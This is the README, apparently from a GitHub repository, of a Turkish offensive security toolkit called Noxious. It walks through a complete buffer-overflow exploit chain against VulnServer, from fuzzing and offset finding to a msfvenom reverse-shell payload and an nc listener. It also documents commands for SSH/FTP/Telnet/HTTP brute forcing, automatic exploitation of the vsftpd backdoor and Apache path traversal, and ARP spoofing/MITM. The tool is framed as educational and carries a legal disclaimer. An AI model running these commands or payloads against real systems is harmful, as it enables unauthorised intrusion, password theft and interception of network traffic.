# NOXIOUS — Buffer Overflow Exploit Toolkit & Ağ Sızma Testi Aracı

```
███╗   ██╗██████╗ ██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
████╗  ██║██╔══██╗╚██╗██╔╝██║██╔══██╗██║   ██║██╔════╝
██╔██╗ ██║██║  ██║ ╚███╔╝ ██║██║  ██║██║   ██║███████╗
██║╚██╗██║██║  ██║ ██╔██╗ ██║██║  ██║██║   ██║╚════██║
██║ ╚████║██████╔╝██╔╝ ██╗██║██████╔╝╚██████╔╝███████║
╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝
```

VulnServer ve benzeri hedeflere yönelik adım adım buffer overflow exploit geliştirme aracı ve ağ sızma testi platformu. Kali Linux ve Python 3.6+ ile tam uyumludur.

Dil: **Türkçe** | [English](README_EN.md)

---

## Özellikler

| Özellik | Açıklama |
|---|---|
| **Akıllı Fuzzer** | Artımlı buffer ile çökme noktası tespiti |
| **Binary Search** | Kesin çökme noktasını otomatik bulma |
| **Dinamik Pattern Üreteci** | Harici araca bağımlılığı olmadan cyclic pattern üretimi |
| **Otomatik Offset Hesaplama** | EIP değerinden offset tespiti (Metasploit uyumlu) |
| **Kötü Karakter Analizi** | Dinamik byte dizisi, hex dump görüntüsü |
| **Final Exploit** | struct.pack, NOP sled, shellcode dosya desteği |
| **msfvenom Entegrasyonu** | Otomatik shellcode üretim komutu önerisi |
| **Çoklu Komut Desteği** | TRUN, GMON, KSTET, GTER, HTER, LTER ve daha fazlası |
| **Ağ Keşfi** | ARP/ICMP/TCP ile aynı ağın aktif cihazlarını otomatik tespit |
| **Port Tarama** | Hızlı/tam/tüm profilleriyle paralel port tarama motoru |
| **Servis Tespiti** | Banner grabbing, HTTP header analizi, SSL sertifika okuma |
| **Zafiyet Veritabanı** | Bilinen CVE'lerle servis versiyonlarını otomatik eşleştirme |
| **Kaba Kuvvet (Brute Force)** | FTP, SSH, Telnet ve HTTP Basic Auth paralel parola kırma |
| **Otomatik Servis Exploit** | vsftpd 2.3.4 backdoor, Apache Path Traversal, FTP anonim giriş |
| **ARP Spoofing / MITM** | Ağ trafiğini araya girme ve zehirleme (root) |
| **Rapor Oluşturma** | Terminal, JSON ve metin formatında detaylı sızma testi raporu |
| **Renkli Terminal Çıktısı** | ANSI renkli banner, seviye bazlı loglama |
| **Dosya Loglama** | Log çıktısını dosyaya kaydetme |

---

## Kurulum

### Kali Linux (Önerilen)

Harici bağımlılığı yoktur. Doğrudan çalıştırabilirsiniz:

```bash
git clone https://github.com/erensogutlu/noxious.git
cd noxious
chmod +x noxious.py
```

### Windows / Diğer Sistemler

```bash
git clone https://github.com/erensogutlu/noxious.git
cd noxious
python3 noxious.py --help
```

### Python Sürüm Uyumluluğu

| Python Sürümü | Durum |
|---|---|
| Python 3.6 | Desteklenir |
| Python 3.7 | Desteklenir |
| Python 3.8 | Desteklenir |
| Python 3.9 | Desteklenir |
| Python 3.10 | Desteklenir |
| Python 3.11 | Desteklenir |
| Python 3.12 | Desteklenir |
| Python 3.13+ | Desteklenir |

> **Harici pip paketi gerektirmez!** Sadece Python standart kütüphanesi kullanılır.

---

## Kullanım — Adım Adım Rehber

Noxious'u kullanmadan önce bilmeniz gereken **2 temel bilgi** var:

1. **Hedef IP** → VulnServer'ın çalıştığı makinenin IP adresi (örnek: `10.0.2.4`)
2. **Port** → VulnServer'ın dinlediği port numarası (varsayılan: `9999`)

> **Buffer overflow exploit geliştirme 5 aşamadan oluşur:**
> Fuzzing → Offset Tespiti → Kötü Karakter Analizi → JMP ESP Bulma → Final Exploit.
> Noxious bu 5 aşamanın 4'ünü otomatize eder (JMP ESP için mona.py/Immunity Debugger kullanılır).

---

### 1. Fuzzing — Çökme Noktasını Bulma

**Ne yapar?** Hedef servise giderek artan boyutlarda buffer gönderir. Servis çökene kadar devam eder ve çökme noktasını (yaklaşık byte sayısı) raporlar.

**Ne zaman kullanılır?** Exploit geliştirmenin ilk adımı. Hedefin kaç byte'ta çökeceğini bilmiyorsanız, buradan başlayın.

```bash
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999
```

**Parçalara ayırarak açıklayalım:**

| Parametre | Ne yazılır | Anlamı |
|---|---|---|
| `--hedef` | `10.0.2.4` | VulnServer'ın çalıştığı IP adresi |
| `--port` | `9999` | VulnServer'ın dinlediği port |

**Gelişmiş parametreler:**

```bash
# Başlangıç boyutunu, adım miktarını ve maksimum boyutu ayarlama
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 \
    --baslangic 200 --adim 200 --maksimum 5000

# Gönderimler arası beklemeyi azaltma (hızlı tarama)
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 --bekleme 0.5

# Farklı bir VulnServer komutunu test etme
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999 --komut GMON
```

**Örnek çıktı:**
```
[*] hedef          : 10.0.2.4:9999
[*] başlangıç      : 100 byte
[*] adım           : 100 byte
[+] hedef erişilebilir, fuzzing başlıyor...

[*] [0001] gönderiliyor: 100 byte
[*] [0002] gönderiliyor: 200 byte
...
[*] [0021] gönderiliyor: 2100 byte

[+] hedef çöktü! çökme boyutu: ~2100 byte
[+] kesin çökme noktası: 2003 byte

[*] sonraki adım: offset tespiti için pattern gönderimi
[*]   python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 2500
```

---

### 2. Offset Tespiti — EIP Register Kontrolü

**Ne yapar?** Benzersiz bir karakter deseni (cyclic pattern) üretir ve hedefe gönderir. Debugger'da EIP register'ında görünen değeri kullanarak kesin offset'i hesaplar.

**Ne zaman kullanılır?** Fuzzing ile çökme noktasını bulduktan sonra, EIP'nin kaçıncı byte'ta kontrol edilebildiğini bulmak için.

**Adım 1 — Deseni gönder:**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 3000
```

**Adım 2 — Debugger'da EIP değerini not edin** (örnek: `386F4337`)

**Adım 3 — Offset'i hesaplayın:**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 3000 --eip 386F4337
```

**Parçalara ayırarak açıklayalım:**

| Parametre | Ne yazılır | Anlamı |
|---|---|---|
| `--hedef` | `10.0.2.4` | VulnServer IP adresi |
| `--uzunluk` | `3000` | Üretilecek desen uzunluğu (çökme noktasından büyük olmalı) |
| `--eip` | `386F4337` | Debugger'dan alınan EIP hex değeri |

**Çevrimdışı mod (ağ bağlantısı gerekmez):**

```bash
python3 noxious.py offset --hedef 10.0.2.4 --sadece-hesapla --eip 386F4337
```

> `--sadece-hesapla` parametresi hedefe bağlantı kurmadan, sadece EIP değerinden offset hesaplar. Hedefe tekrar bağlanılamadığı durumlarda kullanışlıdır.

**Örnek çıktı:**
```
[*] desen uzunluğu : 3000 karakter
[+] desen üretildi (3000 karakter)
[+] desen başarıyla gönderildi

[*] eip değeri ile offset hesaplanıyor: 0x386F4337
[+] kesin offset bulundu: 2003

[*] sonraki adım: kötü karakter analizi
[*]   python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003
```

---

### 3. Kötü Karakter Analizi

**Ne yapar?** Null byte (\x00) hariç tüm byte değerlerini (0x01-0xFF) hedefe gönderir. Debugger'da ESP'yi takip ederek hangi byte'ların bozulup hangilerinin geçtiğini tespit edersiniz.

**Ne zaman kullanılır?** Offset bulduktan sonra. Shellcode'da kullanılmaması gereken byte'ları belirlemek için.

**İlk deneme — tüm karakterleri gönder:**

```bash
python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003
```

**Kötü karakter bulduysanız — hariç tutarak tekrar dene:**

```bash
python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003 --haric 0a,0d
```

**Parçalara ayırarak açıklayalım:**

| Parametre | Ne yazılır | Anlamı |
|---|---|---|
| `--hedef` | `10.0.2.4` | VulnServer IP adresi |
| `--offset` | `2003` | Daha önce bulunan EIP offset değeri |
| `--haric` | `0a,0d` | Hariç tutulacak byte'lar (virgüllü, hex) |

> **Kötü karakter nasıl bulunur?**
> 1. Debugger'da (Immunity/x64dbg) ESP register'ına sağ tıklayın
> 2. "Follow in Dump" seçin
> 3. Hex dump'ta 01 02 03... sırasıyla byte'ların aktığını kontrol edin
> 4. Sırası bozulan veya atlanan byte'ları not edin — bunlar kötü karakterlerdir
> 5. Bulunan kötü karakterleri `--haric` parametresine ekleyerek tekrar gönderin
> 6. Tüm byte'lar düzgün akana kadar tekrarlayın

**Örnek çıktı:**
```
[*] eip offset     : 2003
[*] hariç tutulan  : \x00, \x0a, \x0d
[*] test karakter sayısı: 253 byte

00000000  01 02 03 04 05 06 07 08  09 0b 0c 0e 0f 10 11 12  |................|
00000010  13 14 15 16 17 18 19 1a  1b 1c 1d 1e 1f 20 21 22  |............. !"|
...

[+] payload başarıyla gönderildi
```

---

### 4. Final Exploit — Shellcode ile Saldırı

**Ne yapar?** Tüm toplanan bilgileri (offset, JMP ESP adresi, shellcode) birleştirerek final exploit payload'ını oluşturur ve hedefe gönderir. Başarılı olursa reverse shell elde edersiniz.

**Ne zaman kullanılır?** Offset ve kötü karakterleri bulduktan, JMP ESP adresini mona.py ile tespit ettikten sonra. Bu son adımdır.

**Test modu (shellcode olmadan, debugger'da doğrulama için):**

```bash
python3 noxious.py exploit --hedef 10.0.2.4 --port 9999 \
    --offset 2003 --jmp-adresi 625011af
```

**Gerçek exploit (shellcode dosyasından):**

```bash
python3 noxious.py exploit --hedef 10.0.2.4 --port 9999 \
    --offset 2003 --jmp-adresi 625011af \
    --shellcode-dosyasi payload.bin --nop 64
```

**Parçalara ayırarak açıklayalım:**

| Parametre | Ne yazılır | Anlamı |
|---|---|---|
| `--hedef` | `10.0.2.4` | VulnServer IP adresi |
| `--offset` | `2003` | EIP offset değeri |
| `--jmp-adresi` | `625011af` | mona.py ile bulunan JMP ESP gadget adresi |
| `--shellcode-dosyasi` | `payload.bin` | msfvenom ile üretilen shellcode dosyası |
| `--nop` | `64` | NOP sled boyutu (varsayılan: 32) |

> **Shellcode nasıl üretilir?** Kali Linux'ta msfvenom kullanın:
> ```bash
> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 \
>     EXITFUNC=thread -f python -a x86 -b "\x00"
> ```
> Çıktıyı bir dosyaya kaydedin ve `--shellcode-dosyasi` ile verin. Araç hem msfvenom python formatını hem de raw binary dosyaları destekler.

**Örnek çıktı:**
```
[*] eip offset     : 2003
[*] jmp esp adresi : 0x625011af
[*] nop sled       : 32 byte

[*] payload yapısı:
[*]   komut kısmı    : 10 byte
[*]   dolgu (A)      : 2003 byte
[*]   jmp esp        : 4 byte
[*]   nop sled       : 32 byte
[*]   shellcode      : 351 byte
[*] ----------------------------------------
[*]   toplam payload : 2400 byte

[+] exploit başarıyla gönderildi!
[*] reverse shell bekliyorsanız:
[*]   nc -lvnp 4444
```

---

### 5. Loglama (Çıktıyı Dosyaya Kaydetme)

Her modül çalıştırılırken log çıktısı dosyaya kaydedilebilir:

```bash
# Log dosyasına kaydet
python3 noxious.py --log-dosyasi sonuc.log fuzzing --hedef 10.0.2.4

# Sessiz mod — sadece hata ve başarı mesajları
python3 noxious.py --sessiz exploit --hedef 10.0.2.4 --jmp-adresi 625011af

# Ayıklama (debug) modu — ekstra detay
python3 noxious.py --ayiklama fuzzing --hedef 10.0.2.4
```

---

### 6. Yardım Menüsü

Tüm parametreleri ve kısa açıklamalarını görmek için:

```bash
python3 noxious.py --help
python3 noxious.py fuzzing --help
python3 noxious.py offset --help
python3 noxious.py karakter --help
python3 noxious.py exploit --help
python3 noxious.py bruteforce --help
python3 noxious.py saldiri --help
python3 noxious.py arpspoof --help
```

---

## Hızlı Başlangıç — Sıfırdan Exploit Senaryosu

Hiç bilmiyorsanız, bu adımları sırayla takip edin:

```bash
# Adım 1: Hedef servisi fuzzing ile çökertin ve çökme noktasını öğrenin.
python3 noxious.py fuzzing --hedef 10.0.2.4 --port 9999

# Adım 2: VulnServer'ı yeniden başlatın, pattern gönderin.
#   Debugger'da (Immunity) EIP register değerini not edin.
python3 noxious.py offset --hedef 10.0.2.4 --port 9999 --uzunluk 3000

# Adım 3: Not ettiğiniz EIP değeri ile offset'i hesaplayın.
python3 noxious.py offset --hedef 10.0.2.4 --sadece-hesapla --eip 386F4337

# Adım 4: VulnServer'ı yeniden başlatın, kötü karakterleri test edin.
#   Debugger'da ESP → Follow in Dump yaparak kontrol edin.
#   Bozulan byte'ları --haric ile hariç tutarak tekrarlayın.
python3 noxious.py karakter --hedef 10.0.2.4 --port 9999 --offset 2003

# Adım 5: Immunity Debugger'da mona.py ile JMP ESP adresi bulun.
#   Immunity komut satırına: !mona jmp -r esp -cpb "\x00"

# Adım 6: msfvenom ile shellcode üretin.
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 \
    EXITFUNC=thread -f raw -a x86 -b "\x00" -o payload.bin

# Adım 7: VulnServer'ı yeniden başlatın, exploit'i gönderin.
python3 noxious.py exploit --hedef 10.0.2.4 --port 9999 \
    --offset 2003 --jmp-adresi 625011af --shellcode-dosyasi payload.bin

# Adım 8: Başka bir terminalde reverse shell'i dinleyin.
nc -lvnp 4444
```

---

## Tüm Parametreler (Referans Tablosu)

### Genel Parametreler

| Parametre | Zorunlu mu? | Açıklama |
|---|---|---|
| `--sessiz` | Hayır | Sadece hata ve başarı mesajlarını göster |
| `--ayiklama` | Hayır | Ayıklama (debug) mesajlarını da göster |
| `--log-dosyasi DOSYA` | Hayır | Log çıktısını dosyaya kaydet |

### Fuzzing Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--port` | Hayır | `9999` | Hedef port numarası |
| `--komut` | Hayır | `TRUN` | VulnServer komutu |
| `--baslangic` | Hayır | `100` | Başlangıç tampon boyutu (byte) |
| `--adim` | Hayır | `100` | Her adımdaki artış miktarı (byte) |
| `--maksimum` | Hayır | `10000` | Maksimum tampon boyutu (byte) |
| `--bekleme` | Hayır | `1.0` | Gönderimler arası bekleme (saniye) |
| `--zaman-asimi` | Hayır | `5.0` | Bağlantı zaman aşımı (saniye) |

### Offset Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--port` | Hayır | `9999` | Hedef port numarası |
| `--uzunluk` | Hayır | `3000` | Desen uzunluğu (byte) |
| `--eip` | Hayır | — | Debugger'dan alınan EIP hex değeri |
| `--sadece-hesapla` | Hayır | — | Ağ bağlantısı kurmadan offset hesapla |
| `--komut` | Hayır | `TRUN` | VulnServer komutu |

### Karakter Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--port` | Hayır | `9999` | Hedef port numarası |
| `--offset` | Hayır | `2003` | EIP offset değeri |
| `--haric` | Hayır | — | Hariç tutulacak byte'lar (örnek: `0a,0d`) |
| `--komut` | Hayır | `TRUN` | VulnServer komutu |

### Exploit Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--port` | Hayır | `9999` | Hedef port numarası |
| `--offset` | Hayır | `2003` | EIP offset değeri |
| `--jmp-adresi` | Hayır | `625011af` | JMP ESP gadget adresi (hex) |
| `--shellcode-dosyasi` | Hayır | — | Shellcode dosya yolu |
| `--nop` | Hayır | `32` | NOP sled boyutu (byte) |
| `--komut` | Hayır | `TRUN` | VulnServer komutu |

### Kaba Kuvvet (Brute Force) Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--servis` | Hayır | `ftp` | Hedef servis (`ftp`, `ssh`, `telnet`, `http`) |
| `--port` | Hayır | — | Hedef port (belirtilmezse servis varsayılanı) |
| `--kullanicilar` | Hayır | — | Özel kullanıcı adı listesi dosyası (wordlist) |
| `--parolalar` | Hayır | — | Özel parola listesi dosyası (wordlist) |
| `--yol` | Hayır | `/` | HTTP Basic Auth yolu |
| `--thread` | Hayır | `5` | Paralel thread sayısı |
| `--bekleme` | Hayır | `0.0` | Denemeler arası bekleme süresi (saniye) |
| `--zaman-asimi` | Hayır | `5.0` | Bağlantı zaman aşımı (saniye) |

### Otomatik Servis Exploit Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef IP adresi |
| `--port` | Hayır | — | Hedef port (belirtilmezse yaygın portlar taranır) |
| `--zaman-asimi` | Hayır | `5.0` | Bağlantı zaman aşımı (saniye) |

### ARP Spoofing / MITM Parametreleri

| Parametre | Zorunlu mu? | Varsayılan | Açıklama |
|---|---|---|---|
| `--hedef` | Evet | — | Hedef cihazın IP adresi |
| `--gateway` | Evet | — | Ağ geçidinin (gateway) IP adresi |
| `--arayuz` | Hayır | — | Ağ arayüzü (belirtilmezse otomatik tespit) |
| `--yakala` | Hayır | — | Yakalanan paket akışını ekranda göster |

---

## Proje Yapısı

```
noxious/
├── .gitignore                 ← Git yoksayma kuralları
├── noxious.py                 ← Ana giriş noktası (CLI)
├── saldiri_verileri.py        ← Gömülü kullanıcı/parola/dizin verileri
├── cekirdek/
│   ├── __init__.py            ← Paket init
│   ├── baglanti.py            ← TCP soket bağlantı yöneticisi
│   ├── gunluk.py              ← Renkli loglama sistemi
│   ├── yardimcilar.py         ← Pattern, hex dump, adres yardımcıları
│   └── ag_yardimcilar.py      ← Ağ hesaplama, subnet, ARP yardımcıları
├── moduller/
│   ├── __init__.py            ← Paket init
│   ├── fuzzer.py              ← Akıllı artımlı fuzzer
│   ├── offset_bulucu.py       ← EIP offset tespiti
│   ├── karakter_analiz.py     ← Kötü karakter analizi
│   ├── istismarci.py          ← Final exploit
│   ├── ag_tarayici.py         ← Ağ keşfetme (ARP/ICMP/TCP)
│   ├── port_tarayici.py       ← Port tarama motoru
│   ├── servis_tanımlayici.py  ← Servis/versiyon tespiti
│   ├── raporlayici.py         ← Tarama sonuç raporu
│   ├── brute_force.py         ← Kaba kuvvet parola kırma (FTP/SSH/Telnet/HTTP)
│   ├── ag_saldiri.py          ← Otomatik servis exploit çalıştırma
│   └── arp_spoof.py           ← ARP spoofing / MITM saldırısı
├── zafiyet_veritabani.py      ← Bilinen zafiyet imzaları (CVE)
├── testler.py                 ← 134 unit test
├── spiketest.spk              ← Spike test şablonu
├── requirements.txt           ← Bağımlılık listesi
└── README.md                  ← Bu dosya
```

---

## Sık Sorulan Sorular

**S: Hangi Python sürümünü kullanmalıyım?**  
Python 3.6 ve üzeri herhangi bir sürüm çalışır. Kali Linux'ta varsayılan `python3` yeterlidir. Kontrol için: `python3 --version`

**S: pip install gerekiyor mu?**  
Hayır. Noxious sadece Python standart kütüphanesini kullanır. Harici hiçbir paket gerekmez.

**S: VulnServer nedir ve nasıl kurulur?**  
VulnServer, buffer overflow eğitimi için özel olarak tasarlanmış bir TCP sunucusudur. Windows sanal makineye indirip çalıştırın: `vulnserver.exe`

**S: Debugger olarak ne kullanmalıyım?**  
Immunity Debugger (ücretsiz) önerilir. mona.py eklentisini kurarak JMP ESP adresi bulabilirsiniz. Alternatif: x64dbg.

**S: JMP ESP adresini nasıl bulurum?**  
Immunity Debugger'da mona.py kullanın. Komut satırına yazın: `!mona jmp -r esp -cpb "\x00"`

**S: Shellcode'u nasıl üretirim?**  
Kali Linux'ta msfvenom kullanın:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 \
    EXITFUNC=thread -f python -a x86 -b "\x00"
```

**S: "Bağlantı reddedildi" hatası alıyorum?**  
VulnServer'ın çalıştığından ve doğru IP/port kullandığınızdan emin olun. VulnServer çöktüyse yeniden başlatın.

**S: Farklı VulnServer komutlarını test edebilir miyim?**  
Evet. `--komut` parametresiyle TRUN, GMON, KSTET, GTER, HTER, LTER, KSTAN, STATS, RTIME, LTIME komutlarını test edebilirsiniz.

**S: Kali Linux dışında çalışır mı?**  
Evet. Windows, Ubuntu, Debian ve diğer Linux dağıtımlarında da çalışır. Sadece Python 3.6+ gereklidir.

---

## Ağ Sızma Testi Komutları

### Ağ Keşfetme

```bash
# Otomatik subnet tespiti ile tarama
python3 noxious.py kesfet

# Manuel subnet belirtme
python3 noxious.py kesfet --subnet 192.168.1.0/24

# Tarama yöntemi seçimi
python3 noxious.py kesfet --subnet 192.168.1.0/24 --yontem arp
python3 noxious.py kesfet --subnet 192.168.1.0/24 --yontem tcp

# Thread sayısı ve zaman aşımı
python3 noxious.py kesfet --subnet 192.168.1.0/24 --thread 100 --zaman-asimi 2
```

### Port Tarama

```bash
# Hızlı port tarama (top 100 port)
python3 noxious.py portscan --hedef 192.168.1.10

# Tam tarama (top 1000 port)
python3 noxious.py portscan --hedef 192.168.1.10 --profil tam

# Özel port aralığı
python3 noxious.py portscan --hedef 192.168.1.10 --portlar 1-1024

# Belirli portlar
python3 noxious.py portscan --hedef 192.168.1.10 --portlar 22,80,443,8080,9999
```

### Servis Tespiti

```bash
# Belirli bir hedefin servislerini tanımla
python3 noxious.py servis --hedef 192.168.1.10

# Belirli portlarda servis tespiti
python3 noxious.py servis --hedef 192.168.1.10 --portlar 22,80,9999
```

### Kaba Kuvvet Parola Saldırısı (Brute Force)

```bash
# Varsayılan FTP kaba kuvvet (gömülü wordlist ile)
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis ftp

# SSH parola kırma (özel wordlist dosyaları ile)
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis ssh \
    --kullanicilar users.txt --parolalar pass.txt

# Telnet kaba kuvvet saldırısı
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis telnet --port 23

# HTTP Basic Auth parola kırma
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis http --yol /admin

# Hız ve thread ayarlı kaba kuvvet
python3 noxious.py bruteforce --hedef 192.168.1.10 --servis ftp \
    --thread 10 --bekleme 0.5
```

### Otomatik Servis Exploit Saldırısı

```bash
# Hedef üzerindeki tüm açık servisleri tara ve zafiyetleri exploit et
python3 noxious.py saldiri --hedef 192.168.1.10

# Belirli bir porta yönelik servis exploit çalıştırma (örnek: FTP port 21)
python3 noxious.py saldiri --hedef 192.168.1.10 --port 21

# Web sunucusuna yönelik Path Traversal / Dizin Tarama exploit'leri
python3 noxious.py saldiri --hedef 192.168.1.10 --port 80
```

### ARP Spoofing / MITM Saldırısı

```bash
# Hedef ve gateway arasında ARP tablosu zehirleme (root/sudo gerektirir)
sudo python3 noxious.py arpspoof --hedef 192.168.1.10 --gateway 192.168.1.1

# Paket yakalama ve canlı akış gösterimi ile MITM
sudo python3 noxious.py arpspoof --hedef 192.168.1.10 --gateway 192.168.1.1 --yakala

# Belirli ağ arayüzü belirterek ARP spoofing
sudo python3 noxious.py arpspoof --hedef 192.168.1.10 --gateway 192.168.1.1 --arayuz eth0
```

### Tam Otomatik Rapor

```bash
# Tek komutla: keşfet → port tara → servis tanımla → rapor oluştur
python3 noxious.py rapor --subnet 192.168.1.0/24

# JSON çıktı ile
python3 noxious.py rapor --subnet 192.168.1.0/24 --format json --cikti rapor.json

# Metin dosyası olarak
python3 noxious.py rapor --subnet 192.168.1.0/24 --format metin --cikti rapor.txt
```

---

## Yasal Uyarı

Bu araç **yalnızca eğitim ve yetkili güvenlik testleri** için tasarlanmıştır.
İzinsiz sistemlere saldırı **yasa dışıdır** ve ciddi hukuki sonuçlar doğurabilir.
Aracı kullanmadan önce ilgili sistem yöneticisinden **yazılı izin** aldığınızdan emin olun.

> **Ağ Tarama Uyarısı**: Bu aracın ağ keşfetme, port tarama ve servis tespiti
> özellikleri yerel ağınızda veya yetkili olduğunuz ağlarda kullanım içindir.
> Yetkisiz ağ taraması çoğu ülkede yasadışıdır. Root/sudo ile çalıştırılan
> ARP ve ICMP taramaları ağ trafiği oluşturur ve tespit edilebilir.

---

## Lisans

Bu proje eğitim amaçlıdır.

---

**Geliştirici:** Eren  
**Sürüm:** 1.0.0  
**Platform:** Kali Linux / Python 3.6+
